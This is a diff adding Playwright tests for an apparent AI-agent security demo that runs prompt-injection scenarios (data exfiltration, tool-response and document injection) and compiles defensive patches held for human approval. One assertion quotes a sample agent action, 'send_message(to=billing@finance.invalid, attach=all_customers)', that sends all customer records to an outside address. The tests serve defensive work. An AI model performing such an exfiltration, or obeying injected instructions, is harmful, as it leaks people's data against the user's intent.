@@ -66,3 +66,32 @@ test("theatre screenshots for both viewports", async ({ page }) => {
   expect(overflow).toBeLessThanOrEqual(1);
   await page.screenshot({ path: `test-results/screens/${test.info().project.name}-theatre.png`, fullPage: true });
 });
+
+test("security patch: compile from a sibling failure, review, and see nothing applied", async ({ page }) => {
+  await page.goto("/theatre/");
+  await page.getByLabel("Attack scenario").selectOption("data_exfiltration");
+  await page.getByRole("button", { name: "Run Attack Theatre" }).click();
+  await expect(page.getByRole("heading", { name: /5 · Human approval/ })).toBeVisible({ timeout: 12_000 });
+  await page.getByLabel("Deployed policy").selectOption("violation_patch|tool_response_injection");
+  await page.getByRole("button", { name: "Compile security patch" }).click();
+  const patch = page.getByLabel("Compiled patch");
+  await expect(patch).toContainText("send_message(to=billing@finance.invalid, attach=all_customers)");
+  await expect(patch.getByRole("row", { name: /fixed-on-proposed/ })).toContainText("pass");
+  await expect(patch.getByRole("row", { name: /sibling-tool_response_injection/ })).toContainText("held-out");
+  await expect(patch).toContainText("applied: false");
+  const [download] = await Promise.all([page.waitForEvent("download"), patch.getByRole("button", { name: "Download patch (JSON)" }).click()]);
+  expect(download.suggestedFilename()).toMatch(/necroshield-patch-[0-9a-f]{16}\.json/);
+  await page.getByLabel("Deployed policy").selectOption("allow_all|");
+  await page.getByRole("button", { name: "Compile security patch" }).click();
+  await expect(patch).toBeVisible();
+});
+
+test("a patch request with nothing to fix explains why", async ({ page }) => {
+  await page.goto("/theatre/");
+  await page.getByLabel("Attack scenario").selectOption("document_injection");
+  await page.getByRole("button", { name: "Run Attack Theatre" }).click();
+  await expect(page.getByRole("heading", { name: /5 · Human approval/ })).toBeVisible({ timeout: 12_000 });
+  await page.getByLabel("Deployed policy").selectOption("tool_allowlist|");
+  await page.getByRole("button", { name: "Compile security patch" }).click();
+  await expect(page.locator("p[role=alert]")).toContainText("no failure observed");
+});
